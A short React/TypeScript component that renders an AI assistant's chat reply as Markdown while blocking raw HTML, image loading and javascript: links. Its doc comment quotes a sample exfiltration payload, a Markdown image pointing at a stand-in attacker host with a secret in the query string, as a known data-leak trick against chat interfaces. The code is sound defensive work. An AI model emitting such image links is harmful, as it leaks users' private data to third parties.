import Markdown, { type Components } from "react-markdown";

/**
 * Renders the AI's reply as Markdown, safely:
 * - raw HTML in the reply is never interpreted (react-markdown escapes it; no rehype-raw)
 * - images are NOT loaded: a reply like ![x](https://evil.example/?q=<secret>) would otherwise make the browser send data to a
 *   third party (a known exfiltration trick against chat UIs). The image's alt text and address are shown instead.
 * - links open in a new tab without referrer; javascript: URLs are removed by react-markdown's default URL filter
 */
const components: Components = {
  img: ({ alt, src }) => (
    <span className="md-img-blocked" title={typeof src === "string" ? src : undefined}>
      [image not loaded{alt ? `: ${alt}` : ""}]
    </span>
  ),
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow">
      {children}
    </a>
  ),
};

export function Reply({ text }: { text: string }) {
  return (
    <div className="md">
      <Markdown components={components}>{text}</Markdown>
    </div>
  );
}
